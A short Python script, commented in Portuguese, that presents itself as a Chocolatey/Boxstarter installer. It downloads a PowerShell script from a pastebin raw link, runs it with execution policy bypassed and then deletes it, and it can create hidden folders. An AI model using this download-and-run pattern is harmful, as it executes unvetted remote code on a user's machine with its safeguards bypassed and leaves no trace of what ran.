# Script para instalação do Chocolatey/Boxstarter

import os
import requests


def executar_comando(comando):
    import subprocess

    print("Executando o comando: '{}'".format(comando), flush=True)
    subprocess.call(comando, shell=True)


def criar_tempfile(sufixo, url, caminho=None, oculto=False):
    import tempfile

    if caminho is not None:
        if not os.path.exists(caminho):
            os.mkdir(caminho)
            if oculto:
                os.popen('attrib +h ' + str(caminho))

    temp_file, temp_path = tempfile.mkstemp(suffix=sufixo, dir=caminho, text=True)

    response = requests.get(url)

    with open(temp_path, mode='w', encoding="utf-8") as f:
        f.write(str(response.text))

    os.close(temp_file)

    return temp_path


if __name__ == "__main__":
    os.makedirs('C:\\layout', exist_ok=True)
    tmp_file = criar_tempfile('.ps1', 'https://pastebin.com/raw/AGs7x79Q')
    executar_comando(f'@powershell -NoProfile -ExecutionPolicy bypass -File {tmp_file}')
    os.remove(tmp_file)
